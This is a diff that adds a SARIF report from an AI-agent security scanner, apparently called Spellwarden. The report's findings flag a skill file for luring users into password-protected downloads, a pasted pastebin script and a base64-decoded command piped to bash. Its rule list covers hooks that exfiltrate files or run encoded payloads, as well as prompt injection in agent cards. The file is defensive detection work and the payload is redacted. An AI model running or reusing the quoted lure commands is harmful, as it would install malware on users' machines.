@@ -1,0 +1,1884 @@
+{
+  "$schema": "https://docs.oasis-open.org/sarif/sarif/v2.1.0/errata01/os/schemas/sarif-schema-2.1.0.json",
+  "runs": [
+    {
+      "results": [
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SKILL.md"
+                },
+                "region": {
+                  "startLine": 26
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Encoded payload decoded and executed: echo 'Y3Vy***' | base64 -d | bash"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "cbae8650ed58ef5188bf9fb084b0b739e5adaa433dac077ea28e8d7e9b8e9345"
+          },
+          "ruleId": "SW-SKL-004",
+          "ruleIndex": 49
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SKILL.md"
+                },
+                "region": {
+                  "startLine": 16
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Instructions lure the user into running a password-protected download or a pasted script: - **Windows:** download [toolkit.zip](https://files.example.com/dl/toolkit.zip) (pass: *** and run the installer inside."
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "34b8efe4680939925ea7229262b7bb45f268c4717f1db7462552d9a0a9b0a4af"
+          },
+          "ruleId": "SW-SKL-032",
+          "ruleIndex": 63
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SKILL.md"
+                },
+                "region": {
+                  "startLine": 17
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Instructions lure the user into running a password-protected download or a pasted script: - **macOS:** download https://files.example.com/dl/toolkit.dmg, then open it and launch the app (pass: ***"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "4b0b2cbfcdd3e16f2640d95f5a215c4fdca2968421b932e3e090f240846d2f8e"
+          },
+          "ruleId": "SW-SKL-032",
+          "ruleIndex": 63
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SKILL.md"
+                },
+                "region": {
+                  "startLine": 21
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Instructions lure the user into running a password-protected download or a pasted script: Copy the repair script from https://pastebin.com/raw/Zq81ExAmPle and paste it into Terminal."
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "3fb61429f53db59914871cfde40389894766ea707ca3dfc910e0c1eea5b3a0e3"
+          },
+          "ruleId": "SW-SKL-032",
+          "ruleIndex": 63
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SKILL.md"
+                },
+                "region": {
+                  "startLine": 26
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Instructions lure the user into running a password-protected download or a pasted script: echo 'Y3Vy***' | base64 -d | bash"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "2b890c7b2e9307b8d10991e9ee3ab0e4217fcde9465610e83cdcdf311e22f125"
+          },
+          "ruleId": "SW-SKL-032",
+          "ruleIndex": 63
+        },
+        {
+          "level": "error",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SKILL.md"
+                },
+                "region": {
+                  "startLine": 26
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "Remote script piped to a shell: Matched after normalising: echo 'Y3Vy***' | base64 -d | bash"
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "2226c4f0daae8bea09f5e36e70c45dc19ddeb1a240b75a73cb39aa2029fb238e"
+          },
+          "ruleId": "SW-SKL-007",
+          "ruleIndex": 52
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SKILL.md"
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "The description has no use-when clause (\"use when\", \"use this when\", \"when the user\" or \"triggers on\"), so an agent has to guess when the skill applies."
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "19b2cd8541a781373293dbd73fb2cd34edc22001adc278ea52ea0d924a97882a"
+          },
+          "properties": {
+            "description_lint": true
+          },
+          "ruleId": "SW-LINT-002",
+          "ruleIndex": 67
+        },
+        {
+          "level": "note",
+          "locations": [
+            {
+              "physicalLocation": {
+                "artifactLocation": {
+                  "uri": "SKILL.md"
+                }
+              }
+            }
+          ],
+          "message": {
+            "text": "The description names no trigger phrase: no quoted phrase and no list of requests, so an agent has few words to match a request against."
+          },
+          "partialFingerprints": {
+            "spellwarden/v1": "a80bb831d2b598f03f83583dbb815cc1befe085b79a9dff7294fecd18ef7db92"
+          },
+          "properties": {
+            "description_lint": true
+          },
+          "ruleId": "SW-LINT-003",
+          "ruleIndex": 68
+        }
+      ],
+      "tool": {
+        "driver": {
+          "informationUri": "https://github.com/spellwarden-ai/spellwarden",
+          "name": "Spellwarden",
+          "rules": [
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Add the missing members, correct the wrong types and write each protocolVersion as 1.0, then scan again.\n\n[How to fix SW-A2A-001](https://spellwarden.ai/docs/rules/sw-a2a-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Add the missing members, correct the wrong types and write each protocolVersion as 1.0, then scan again."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-001",
+              "name": "AgentCardDoesNotFollowA2A10",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card does not follow A2A 1.0"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Move the card to the A2A 1.0 format, with supportedInterfaces and securityRequirements in place of the old members, then sign it again.\n\n[How to fix SW-A2A-002](https://spellwarden.ai/docs/rules/sw-a2a-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Move the card to the A2A 1.0 format, with supportedInterfaces and securityRequirements in place of the old members, then sign it again."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-002",
+              "name": "AgentCardUsesAFormatOlderThanA2A10",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card uses a format older than A2A 1.0"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Serve the card at /.well-known/agent-card.json, and keep a copy at the old path only until a date you set.\n\n[How to fix SW-A2A-003](https://spellwarden.ai/docs/rules/sw-a2a-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Serve the card at /.well-known/agent-card.json, and keep a copy at the old path only until a date you set."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-003",
+              "name": "AgentCardAtThePathUsedBeforeA2A03",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card at the path used before A2A 0.3"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Serve the agent endpoint and every authentication address over https, and write the final https addresses in the card.\n\n[How to fix SW-A2A-004](https://spellwarden.ai/docs/rules/sw-a2a-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Serve the agent endpoint and every authentication address over https, and write the final https addresses in the card."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-004",
+              "name": "AgentEndpointOrAuthenticationURLNotServedOverHTTPS",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SC-8"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent endpoint or authentication URL not served over HTTPS"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Replace the implicit or password flow with authorizationCode and pkceRequired, clientCredentials or deviceCode, and switch the old flow off at the identity provider.\n\n[How to fix SW-A2A-005](https://spellwarden.ai/docs/rules/sw-a2a-005?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Replace the implicit or password flow with authorizationCode and pkceRequired, clientCredentials or deviceCode, and switch the old flow off at the identity provider."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-005?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-005",
+              "name": "OAuthImplicitOrPasswordFlowDeclaredDeprecatedInA2A10",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "OAuth implicit or password flow declared (deprecated in A2A 1.0)"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Set pkceRequired to true in the authorization code flow, and turn on the matching setting at the identity provider.\n\n[How to fix SW-A2A-006](https://spellwarden.ai/docs/rules/sw-a2a-006?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Set pkceRequired to true in the authorization code flow, and turn on the matching setting at the identity provider."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-006?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-006",
+              "name": "OAuthAuthorizationCodeFlowWithoutPKCERequired",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "IA-5"
+                ]
+              },
+              "shortDescription": {
+                "text": "OAuth authorization code flow without PKCE required"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Define a scheme in securitySchemes and name it in securityRequirements, or accept the finding with a note if the agent is meant to be open.\n\n[How to fix SW-A2A-007](https://spellwarden.ai/docs/rules/sw-a2a-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Define a scheme in securitySchemes and name it in securityRequirements, or accept the finding with a note if the agent is meant to be open."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-007",
+              "name": "AgentDeclaresNoAuthentication",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "AC-3",
+                  "AML.T0132"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent declares no authentication"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Send the API key in a header instead of the URL query, and rotate every key that has already been sent in an address.\n\n[How to fix SW-A2A-008](https://spellwarden.ai/docs/rules/sw-a2a-008?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Send the API key in a header instead of the URL query, and rotate every key that has already been sent in an address."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-008?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-008",
+              "name": "APIKeySentInTheURLQuery",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "IA-5",
+                  "AML.T0055"
+                ]
+              },
+              "shortDescription": {
+                "text": "API key sent in the URL query"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "help": {
+                "markdown": "Give each skill its own securityRequirements that name only the scopes that skill needs.\n\n[How to fix SW-A2A-009](https://spellwarden.ai/docs/rules/sw-a2a-009?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Give each skill its own securityRequirements that name only the scopes that skill needs."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-009?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-009",
+              "name": "SkillInheritsEveryScopeOfTheAgent",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "AC-6"
+                ]
+              },
+              "shortDescription": {
+                "text": "Skill inherits every scope of the agent"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Sign the final card again after the last edit, or add the signing key to the key file that a2a.keys names, as the evidence says.\n\n[How to fix SW-A2A-010](https://spellwarden.ai/docs/rules/sw-a2a-010?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Sign the final card again after the last edit, or add the signing key to the key file that a2a.keys names, as the evidence says."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-010?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-010",
+              "name": "AgentCardSignatureDoesNotVerify",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card signature does not verify"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Fix the signer so it writes a compact JWS with an allowed algorithm and a kid in the protected header, then sign the card again.\n\n[How to fix SW-A2A-011](https://spellwarden.ai/docs/rules/sw-a2a-011?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Fix the signer so it writes a compact JWS with an allowed algorithm and a kid in the protected header, then sign the card again."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-011?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-011",
+              "name": "AgentCardSignatureIsMalformedOrUsesARefusedAlgorithm",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card signature is malformed or uses a refused algorithm"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "note"
+              },
+              "help": {
+                "markdown": "Sign the card as the last step of each release, and list the public key in the file that a2a.keys names.\n\n[How to fix SW-A2A-012](https://spellwarden.ai/docs/rules/sw-a2a-012?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Sign the card as the last step of each release, and list the public key in the file that a2a.keys names."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-012?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-012",
+              "name": "AgentCardIsNotSigned",
+              "properties": {
+                "security-severity": "3.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card is not signed"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Publish the signing key on the card's own host or list it in the file that a2a.keys names, then sign the card again.\n\n[How to fix SW-A2A-013](https://spellwarden.ai/docs/rules/sw-a2a-013?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Publish the signing key on the card's own host or list it in the file that a2a.keys names, then sign the card again."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-013?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-013",
+              "name": "SigningKeyNotBoundToTheCardSHost",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Signing key not bound to the card's host"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Delete the injected sentence or the hidden characters and describe the agent in plain words, and fix the source if the card is generated.\n\n[How to fix SW-A2A-014](https://spellwarden.ai/docs/rules/sw-a2a-014?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Delete the injected sentence or the hidden characters and describe the agent in plain words, and fix the source if the card is generated."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-014?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-014",
+              "name": "AgentCardTextContainsInjectedInstructionsOrHiddenCharacters",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI01",
+                  "SI-10",
+                  "AML.T0051.001",
+                  "AML.T0110.000"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card text contains injected instructions or hidden characters"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Revoke the credential at its provider first, then remove it from the card, which describes how to authenticate and never holds a key.\n\n[How to fix SW-A2A-015](https://spellwarden.ai/docs/rules/sw-a2a-015?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Revoke the credential at its provider first, then remove it from the card, which describes how to authenticate and never holds a key."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-015?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-015",
+              "name": "CredentialInTheAgentCard",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI03",
+                  "IA-5",
+                  "AML.T0055"
+                ]
+              },
+              "shortDescription": {
+                "text": "Credential in the agent card"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Remove the redirect, or point the a2a.agents entry at the final address of the card.\n\n[How to fix SW-A2A-016](https://spellwarden.ai/docs/rules/sw-a2a-016?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Remove the redirect, or point the a2a.agents entry at the final address of the card."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-016?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-016",
+              "name": "AgentCardFetchedThroughARedirectToAnotherHost",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SC-8",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card fetched through a redirect to another host"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Sign the card with a public-key algorithm such as ES256, publish the public key, and remove the HMAC signature.\n\n[How to fix SW-A2A-017](https://spellwarden.ai/docs/rules/sw-a2a-017?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Sign the card with a public-key algorithm such as ES256, publish the public key, and remove the HMAC signature."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-017?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-017",
+              "name": "AgentCardSignedWithASharedSecretThatOnlyTheAgentCanCheck",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-7",
+                  "AML.T0074"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card signed with a shared secret that only the agent can check"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Make the card strict JSON in UTF-8, without comments, trailing commas or repeated keys, and keep it under the size limit.\n\n[How to fix SW-A2A-018](https://spellwarden.ai/docs/rules/sw-a2a-018?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Make the card strict JSON in UTF-8, without comments, trailing commas or repeated keys, and keep it under the size limit."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-018?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-018",
+              "name": "AgentCardCannotBeRead",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card cannot be read"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Keep only the camelCase JSON name of each member and delete the other spelling, then sign the card again if it is signed.\n\n[How to fix SW-A2A-019](https://spellwarden.ai/docs/rules/sw-a2a-019?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Keep only the camelCase JSON name of each member and delete the other spelling, then sign the card again if it is signed."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-a2a-019?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-A2A-019",
+              "name": "AgentCardMemberSpelledTwoWays",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI07",
+                  "SI-10"
+                ]
+              },
+              "shortDescription": {
+                "text": "Agent card member spelled two ways"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Change the server address to https, or put a proxy you operate in front of a server that only offers http.\n\n[How to fix SW-CFG-001](https://spellwarden.ai/docs/rules/sw-cfg-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Change the server address to https, or put a proxy you operate in front of a server that only offers http."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-001?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-001",
+              "name": "RemoteMCPServerOverPlainHTTP",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "SC-7"
+                ]
+              },
+              "shortDescription": {
+                "text": "Remote MCP server over plain HTTP"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Revoke the credential at its provider, then replace the value in the file with a reference such as ${NAME} that your client expands.\n\n[How to fix SW-CFG-002](https://spellwarden.ai/docs/rules/sw-cfg-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Revoke the credential at its provider, then replace the value in the file with a reference such as ${NAME} that your client expands."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-002?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-002",
+              "name": "CredentialWrittenIntoAnMCPServerConfiguration",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "MCP01",
+                  "MCP07",
+                  "IA-5",
+                  "AML.T0055",
+                  "AML.T0083"
+                ]
+              },
+              "shortDescription": {
+                "text": "Credential written into an MCP server configuration"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Launch the server at an exact version, such as name@1.4.2 for npx, name==1.4.2 for uvx or an image digest, and update it through a reviewed change.\n\n[How to fix SW-CFG-003](https://spellwarden.ai/docs/rules/sw-cfg-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Launch the server at an exact version, such as name@1.4.2 for npx, name==1.4.2 for uvx or an image digest, and update it through a reviewed change."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-003?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-003",
+              "name": "MCPServerLaunchedFromAnUnpinnedPackage",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AST02",
+                  "AST07"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server launched from an unpinned package"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Give the server a host name you control and serve it over https, and replace a shortened link with the address it expands to.\n\n[How to fix SW-CFG-004](https://spellwarden.ai/docs/rules/sw-cfg-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Give the server a host name you control and serve it over https, and replace a shortened link with the address it expands to."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-004?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-004",
+              "name": "MCPServerAtARawIPAddressOrBehindAURLShortener",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "SC-7",
+                  "AML.T0010.005"
+                ]
+              },
+              "shortDescription": {
+                "text": "MCP server at a raw IP address or behind a URL shortener"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Commit the script to the repository and call that file from the hook, or check the download's SHA-256 against a value kept in the repository before it runs.\n\n[How to fix SW-CFG-005](https://spellwarden.ai/docs/rules/sw-cfg-005?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Commit the script to the repository and call that file from the hook, or check the download's SHA-256 against a value kept in the repository before it runs."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-005?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-005",
+              "name": "HookPipesRemoteContentToAShell",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0142"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hook pipes remote content to a shell"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Delete the hook, treat it as an incident, and rotate the credentials in the files it read on every machine that ran it.\n\n[How to fix SW-CFG-006](https://spellwarden.ai/docs/rules/sw-cfg-006?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Delete the hook, treat it as an incident, and rotate the credentials in the files it read on every machine that ran it."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-006?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-006",
+              "name": "HookSendsLocalFileContentsToAnExternalHost",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "SC-7",
+                  "AML.T0142",
+                  "AML.T0086"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hook sends local file contents to an external host"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Remove the hook, decode the string without running it to learn what it does, and rotate anything the machine could reach if it ran.\n\n[How to fix SW-CFG-007](https://spellwarden.ai/docs/rules/sw-cfg-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Remove the hook, decode the string without running it to learn what it does, and rotate anything the machine could reach if it ran."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-007?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-007",
+              "name": "HookDecodesAndRunsAnEncodedPayload",
+              "properties": {
+                "security-severity": "9.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "SR-3",
+                  "AML.T0142",
+                  "AML.T0011.001"
+                ]
+              },
+              "shortDescription": {
+                "text": "Hook decodes and runs an encoded payload"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Remove the settings that switch off approval prompts, or narrow them to named commands and to MCP servers approved one by one.\n\n[How to fix SW-CFG-008](https://spellwarden.ai/docs/rules/sw-cfg-008?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Remove the settings that switch off approval prompts, or narrow them to named commands and to MCP servers approved one by one."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-008?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-008",
+              "name": "SettingsSwitchOffApprovalPrompts",
+              "properties": {
+                "security-severity": "8.0",
+                "tags": [
+                  "security",
+                  "ASI10",
+                  "AC-6",
+                  "AML.T0081"
+                ]
+              },
+              "shortDescription": {
+                "text": "Settings switch off approval prompts"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "warning"
+              },
+              "help": {
+                "markdown": "Add a sha with the full 40-character commit id the plugin was reviewed at, and move to a newer commit only through a reviewed change.\n\n[How to fix SW-CFG-009](https://spellwarden.ai/docs/rules/sw-cfg-009?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
+                "text": "Add a sha with the full 40-character commit id the plugin was reviewed at, and move to a newer commit only through a reviewed change."
+              },
+              "helpUri": "https://spellwarden.ai/docs/rules/sw-cfg-009?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix",
+              "id": "SW-CFG-009",
+              "name": "MarketplacePluginSourceNotPinnedToACommit",
+              "properties": {
+                "security-severity": "5.5",
+                "tags": [
+                  "security",
+                  "ASI04",
+                  "MCP04",
+                  "SR-3",
+                  "AML.T0010.005",
+                  "AML.T0109",
+                  "AST02",
+                  "AST07"
+                ]
+              },
+              "shortDescription": {
+                "text": "Marketplace plugin source not pinned to a commit"
+              }
+            },
+            {
+              "defaultConfiguration": {
+                "level": "error"
+              },
+              "help": {
+                "markdown": "Change the secret at its source, then replace the literal value with a reference such as ${NAME} that your client expands.\n\n[How to fix SW-CFG-010](https://spellwarden.ai/docs/rules/sw-cfg-010?utm_source=scanner&utm_medium=cli&utm_campaign=rule-fix)",
